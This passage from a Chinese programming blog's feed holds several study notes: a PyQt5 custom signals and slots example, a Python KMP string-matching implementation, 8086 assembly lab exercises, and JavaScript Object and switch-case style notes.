class="keyword">class</span> <span class="title">human</span><span class="params">(QObject)</span>:</span></span><br><span class="line">    nameChanged = pyqtSignal(str)</span><br><span class="line">    ageChanged = pyqtSignal([int], [str])</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name=<span class="string">"Mike"</span>, age=<span class="number">10</span>,parent=None)</span>:</span></span><br><span class="line">        super().__init__(parent)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setAge</span><span class="params">(self, age)</span>:</span></span><br><span class="line">        self._age = age</span><br><span class="line">        self.ageChanged.emit(self._age)</span><br><span class="line">        <span class="keyword">if</span> age&lt;=<span class="number">18</span>:</span><br><span class="line">            ageInfo=<span class="string">"你是 少年"</span></span><br><span class="line">        <span class="keyword">elif</span> (<span class="number">18</span>&lt; age &lt;=<span class="number">35</span>):</span><br><span class="line">            ageInfo=<span class="string">"你是 年轻人"</span></span><br><span class="line">        <span class="keyword">elif</span> (<span class="number">35</span>&lt; age &lt;=<span class="number">55</span>):</span><br><span class="line">            ageInfo=<span class="string">"你是 中年人"</span></span><br><span class="line">        <span class="keyword">elif</span> (<span class="number">55</span>&lt; age &lt;=<span class="number">80</span>):</span><br><span class="line">            ageInfo=<span class="string">"您是 老人"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ageInfo=<span class="string">"您是 寿星啊"</span></span><br><span class="line">        self.ageChanged[str].emit(ageInfo)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setName</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        self._name = name</span><br><span class="line">        self.nameChanged.emit(self._name)</span><br></pre></td></tr></table></figure><p>自定义两个信号 <code>nameChanged</code> 和 <code>ageChanged</code></p><p>自定义槽函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyWidget</span><span class="params">(QWidget)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,parent=None)</span>:</span></span><br><span class="line">        super().__init__(parent=parent)</span><br><span class="line">        </span><br><span class="line">        self._ui = Ui_Widget()</span><br><span class="line">        self._ui.setupUi(self)</span><br><span class="line">        self.body = human(<span class="string">"Mike"</span>, <span class="number">20</span>)</span><br><span class="line">        </span><br><span class="line">        self.body.nameChanged.connect(self.do_nameChanged)</span><br><span class="line">        self.body.ageChanged.connect(self.do_ageChanged_int)</span><br><span class="line">        self.body.ageChanged[str].connect(self.do_ageChanged_str)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_horizontalSlider_valueChanged</span><span class="params">(self,value)</span>:</span></span><br><span class="line">        self.body.setAge(value)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_pushButton_clicked</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        当按钮点击时候自动触发该槽函数</span></span><br><span class="line"><span class="string">        从输入框中获取到输入的姓名，接着调用body的setName方法，setName方法会放出一个信号，由于之前设置的连接，直接触发do_nameChanged槽函数</span></span><br><span class="line"><span class="string">        '''</span>    </span><br><span class="line">        hisName = self._ui.lineEdit_5.text()</span><br><span class="line">        self.body.setName(hisName)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># 自定义的槽函数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_nameChanged</span><span class="params">(self,name)</span>:</span></span><br><span class="line">        self._ui.editNameHello.setText(<span class="string">"Hello"</span>+name)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_ageChanged_int</span><span class="params">(self,age)</span>:</span></span><br><span class="line">        self._ui.editAgeStr.setText(str(age))</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">    @pyqtSlot(str)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_ageChanged_str</span><span class="params">(self,ageInfo)</span>:</span></span><br><span class="line">        self._ui.editAgeInt.setText(ageInfo)</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;编写一个简单地GUI应用如下&lt;/p&gt;
&lt;p&gt;&lt;img src= &quot;/img/loading.gif&quot; data-src=&quot;/posts/341a7d9a/1587693985383.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;拖动进度条，下面两个框框会显示不同的数据&lt;/p&gt;
&lt;p&gt;输
      
    
    </summary>
    
    
      <category term="编程" scheme="https://prontosil.me/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="https://prontosil.me/tags/python/"/>
    
      <category term="Qt" scheme="https://prontosil.me/tags/Qt/"/>
    
  </entry>
  
  <entry>
    <title>python实现KMP算法</title>
    <link href="https://prontosil.me/posts/9bd3a30d/"/>
    <id>https://prontosil.me/posts/9bd3a30d/</id>
    <published>2020-04-22T12:23:39.000Z</published>
    <updated>2020-04-25T09:22:34.736Z</updated>
    
    <content type="html"><![CDATA[<p>学习完KMP算法才发现编程如此的奇妙</p><h2 id="求next数组"><a href="#求next数组" class="headerlink" title="求next数组"></a>求next数组</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getNext</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    计算字符串的next数组</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    length = len(s)</span><br><span class="line">    next = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(length)]</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">-1</span></span><br><span class="line">    k = <span class="number">-1</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> j &lt; length<span class="number">-1</span>:</span><br><span class="line">        <span class="comment"># 这个 or 逻辑写的np</span></span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">-1</span> <span class="keyword">or</span> s[j] == s[k]:</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line">            next[j] = k</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            k = next[k]</span><br><span class="line">    <span class="keyword">return</span> next</span><br></pre></td></tr></table></figure><p>从这张图可以看到整个的匹配过程，如果 $p_{k}$ 和 $p_{j}$ 匹配不上，那么就去看 $p_{next[k]}$ 和 $p_{j}$</p><p><img src= "/img/loading.gif" data-src="/posts/9bd3a30d/20150812214857858.png" alt></p><p>比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; &quot;ABCDABD&quot;</span><br></pre></td></tr></table></figure><p>得到的结果就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[-1, 0, 0, 0, 0, 1, 2]</span><br></pre></td></tr></table></figure><p>细节感觉还是要靠自己体会</p><h2 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">KMP</span><span class="params">(s,p)</span>:</span></span><br><span class="line">    next = getNext(p)</span><br><span class="line"></span><br><span class="line">    m,n = <span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> m &lt; len(s) <span class="keyword">and</span> n &lt; len(p):</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">-1</span> <span class="keyword">or</span> p[n] == s[m]:</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            m += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            n = next[n]</span><br><span class="line">    <span class="keyword">if</span> n == len(p):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>从头开始匹配即可，遇到匹配不上的情况就返回到 <code>next[k]</code></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/v_JULY_v/article/details/7041827" target="_blank" rel="noopener">https://blog.csdn.net/v_JULY_v/article/details/7041827</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;学习完KMP算法才发现编程如此的奇妙&lt;/p&gt;
&lt;h2 id=&quot;求next数组&quot;&gt;&lt;a href=&quot;#求next数组&quot; class=&quot;headerlink&quot; title=&quot;求next数组&quot;&gt;&lt;/a&gt;求next数组&lt;/h2&gt;&lt;figure class=&quot;highlight py
      
    
    </summary>
    
    
      <category term="编程" scheme="https://prontosil.me/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="KMP" scheme="https://prontosil.me/tags/KMP/"/>
    
  </entry>
  
  <entry>
    <title>汇编从入门到入土七</title>
    <link href="https://prontosil.me/posts/ce48dac5/"/>
    <id>https://prontosil.me/posts/ce48dac5/</id>
    <published>2020-04-21T11:10:08.000Z</published>
    <updated>2020-04-25T09:22:34.738Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sub al,al ZF&#x3D;1,PF&#x3D;1,SF</span><br><span class="line">mov al,1  ZF&#x3D;0,PF&#x3D;0,SF</span><br><span class="line">push ax</span><br><span class="line">pop bx</span><br><span class="line">add al,bl </span><br><span class="line">add al,10</span><br><span class="line">mul al</span><br></pre></td></tr></table></figure><h2 id="实验十"><a href="#实验十" class="headerlink" title="实验十"></a>实验十</h2><h3 id="打印字符"><a href="#打印字符" class="headerlink" title="打印字符"></a>打印字符</h3><blockquote><p>这里的重点是不知道字符串的长度，但是知道字符串十以0结尾的，所以利用 cx = 0 jcxz 会跳转，不断地置ch=0，当取到的字符cl=0时即可跳转</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">    db &#39;Welcome to masm!&#39;, 0</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">    mov dh,8 ;dh表示行号</span><br><span class="line">    mov dl,3 ;dl表示列号</span><br><span class="line">    mov cl,2 ;cl表示颜色</span><br><span class="line">    mov ax,data</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov si,0 ;字符串开始的位置</span><br><span class="line"></span><br><span class="line">    call show_str</span><br><span class="line">    mov ax,4c00h</span><br><span class="line">    int 21h</span><br><span class="line"></span><br><span class="line">show_str:</span><br><span class="line"></span><br><span class="line">    mov ax,0b800h</span><br><span class="line">    mov es,ax ;显存段</span><br><span class="line"></span><br><span class="line">    mov di,0</span><br><span class="line">    mov ax, 160</span><br><span class="line">    mul dh</span><br><span class="line">    add di,ax </span><br><span class="line"></span><br><span class="line">    mov al,2</span><br><span class="line">    mul dl</span><br><span class="line">    add di,ax ;计算开始的位置</span><br><span class="line"></span><br><span class="line">    mov bl,cl ;保存颜色，因为cx要用来计数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s:</span><br><span class="line">    mov cl, ds:[si] ;取出字符</span><br><span class="line">    mov ch,0 ;当cl&#x3D;0的时候,cx也等于0，此时执行jcxz</span><br><span class="line">    jcxz ok</span><br><span class="line">    mov es:[di], cl</span><br><span class="line">    mov es:[di+1], bl</span><br><span class="line">    add di,2</span><br><span class="line">    inc si</span><br><span class="line">    loop s</span><br><span class="line">ok: ret</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">    db 10 dup(0)</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">    mov ax,12666</span><br><span class="line">    mov bx,data</span><br><span class="line">    mov ds,bx</span><br><span class="line"></span><br><span class="line">    mov si,0</span><br><span class="line"></span><br><span class="line">    call dtoc</span><br><span class="line">    mov dh,8</span><br><span class="line">    mov dl,3</span><br><span class="line">    mov cl,2</span><br><span class="line">    call show_str</span><br><span class="line"></span><br><span class="line">    mov ax,4c00h</span><br><span class="line">    int 21h</span><br><span class="line">dtoc: mov si,9        </span><br><span class="line">   s0: mov cx,10</span><br><span class="line">       mov dx,00 ;dx存放余数</span><br><span class="line">       div cx</span><br><span class="line">       add dx,30H       </span><br><span class="line">       mov [si],dl</span><br><span class="line"></span><br><span class="line">       mov cx,ax ;判断商是否为0</span><br><span class="line">       jcxz rt        </span><br><span class="line"></span><br><span class="line">       dec si</span><br><span class="line">       inc cx  ;防止cx&#x3D;1的时候意外退出循环</span><br><span class="line">       loop s0</span><br><span class="line">rt: ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_str:</span><br><span class="line"></span><br><span class="line">    mov ax,0b800h</span><br><span class="line">    mov es,ax ;显存段</span><br><span class="line"></span><br><span class="line">    mov di,0</span><br><span class="line">    mov ax, 160</span><br><span class="line">    mul dh</span><br><span class="line">    add di,ax </span><br><span class="line"></span><br><span class="line">    mov al,2</span><br><span class="line">    mul dl</span><br><span class="line">    add di,ax ;计算开始的位置</span><br><span class="line"></span><br><span class="line">    mov bl,cl ;保存颜色，因为cx要用来计数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s:</span><br><span class="line">    mov cl, ds:[si] ;取出字符</span><br><span class="line">    mov ch,0 ;当cl&#x3D;0的时候,cx也等于0，此时执行jcxz</span><br><span class="line">    jcxz ok</span><br><span class="line">    mov es:[di], cl</span><br><span class="line">    mov es:[di+1], bl</span><br><span class="line">    add di,2</span><br><span class="line">    inc si</span><br><span class="line">    loop s</span><br><span class="line">ok: ret</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
    
      <category term="编程" scheme="https://prontosil.me/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="汇编" scheme="https://prontosil.me/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>js学习笔记</title>
    <link href="https://prontosil.me/posts/ff9e87b6/"/>
    <id>https://prontosil.me/posts/ff9e87b6/</id>
    <published>2020-04-21T07:46:28.000Z</published>
    <updated>2020-04-25T09:22:34.737Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Object对象"><a href="#Object对象" class="headerlink" title="Object对象"></a>Object对象</h2><h3 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h3><p>Object.keys()，Object.getOwnPropertyNames()</p><p>可以用来遍历对象的属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj1 = &#123;</span><br><span class="line">    <span class="string">"name"</span>:<span class="string">"pxy"</span>,</span><br><span class="line">    <span class="string">"age"</span>:<span class="number">12</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames(obj1)</span><br><span class="line"></span><br><span class="line"><span class="comment">//(2) ["name", "age"]</span></span><br></pre></td></tr></table></figure><h3 id="实例方法"><a href="#实例方法" class="headerlink" title="实例方法"></a>实例方法</h3><p>Object.protype上定义的方法就是实例方法，能够被Object的实例调用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames(<span class="built_in">Object</span>.prototype)</span><br><span class="line"></span><br><span class="line">(<span class="number">12</span>) [<span class="string">"constructor"</span>, <span class="string">"__defineGetter__"</span>, <span class="string">"__defineSetter__"</span>, <span class="string">"hasOwnProperty"</span>, <span class="string">"__lookupGetter__"</span>, <span class="string">"__lookupSetter__"</span>, <span class="string">"isPrototypeOf"</span>, <span class="string">"propertyIsEnumerable"</span>, <span class="string">"toString"</span>, <span class="string">"valueOf"</span>, <span class="string">"__proto__"</span>, <span class="string">"toLocaleString"</span>]</span><br><span class="line"><span class="number">0</span>: <span class="string">"constructor"</span></span><br><span class="line"><span class="number">1</span>: <span class="string">"__defineGetter__"</span></span><br><span class="line"><span class="number">2</span>: <span class="string">"__defineSetter__"</span></span><br><span class="line"><span class="number">3</span>: <span class="string">"hasOwnProperty"</span></span><br><span class="line"><span class="number">4</span>: <span class="string">"__lookupGetter__"</span></span><br><span class="line"><span class="number">5</span>: <span class="string">"__lookupSetter__"</span></span><br><span class="line"><span class="number">6</span>: <span class="string">"isPrototypeOf"</span></span><br><span class="line"><span class="number">7</span>: <span class="string">"propertyIsEnumerable"</span></span><br><span class="line"><span class="number">8</span>: <span class="string">"toString"</span></span><br><span class="line"><span class="number">9</span>: <span class="string">"valueOf"</span></span><br><span class="line"><span class="number">10</span>: <span class="string">"__proto__"</span></span><br><span class="line"><span class="number">11</span>: <span class="string">"toLocaleString"</span></span><br><span class="line">length: <span class="number">12</span></span><br><span class="line">__proto__: <span class="built_in">Array</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>这些方法是所有对象都公有的</p><h3 id="valueOf-NaN"><a href="#valueOf-NaN" class="headerlink" title="valueOf"></a>valueOf</h3><p><code>valueOf</code>方法的作用是返回一个对象的“值”，默认情况下返回对象本身。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">obj.valueOf() === obj <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>但是这种情况除外：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a &#x3D; new Object(1)</span><br><span class="line">a.valueOf() &#x3D;&#x3D;&#x3D; a &#x2F;&#x2F; false</span><br></pre></td></tr></table></figure><p><code>valueOf</code>方法的主要用途是，JavaScript 自动类型转换时会默认调用这个方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"><span class="number">1</span> + obj </span><br><span class="line"><span class="comment">//"1[object Object]"</span></span><br></pre></td></tr></table></figure><p>可以重写 <code>valueOf</code> 方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">obj.valueOf = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">1</span>+obj</span><br><span class="line"><span class="comment">//3</span></span><br></pre></td></tr></table></figure><p>这个很好理解，因为obj查找 <code>valueOf</code> 函数，会先从自己的属性开始找，找不到就通过 <code>__proto__</code> 找上层对象的<code>valueOf</code> 属性</p><h2 id="编码风格"><a href="#编码风格" class="headerlink" title="编码风格"></a>编码风格</h2><h3 id="switch-case-结构"><a href="#switch-case-结构" class="headerlink" title="switch case 结构"></a>switch case 结构</h3><p>不推荐如下的方式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doAction</span>(<span class="params">action</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (action) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'hack'</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'hack'</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'slash'</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'slash'</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'run'</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'run'</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Invalid action.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>推荐使用对象的方式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doAction</span>(<span class="params">action</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> actions = &#123;</span><br><span class="line">    <span class="string">'hack'</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'hack'</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">'slash'</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'slash'</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">'run'</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'run'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> actions[action] !== <span class="string">'function'</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Invalid action.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> actions[action]();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更加简洁</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Object对象&quot;&gt;&lt;a href=&quot;#Object对象&quot; class=&quot;headerlink&quot; title=&quot;Object对象&quot;&gt;&lt;/a&gt;Object对象&lt;/h2&gt;&lt;h3 id=&quot;静态方法&quot;&gt;&lt;a href=&quot;#静态方法&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="编程" scheme="https://prontosil.me/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="js" scheme="https://prontosil.me/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>go相关笔记</title>
    <link href="https://prontosil.me/posts/e0759275/"/>
    <id>https://prontosil.me/posts/e0759275/</id>
    <published>2020-04-21T01:56:26.000Z</published>
    <updated>2020-04-21T04:23:37.231Z</updated>
    
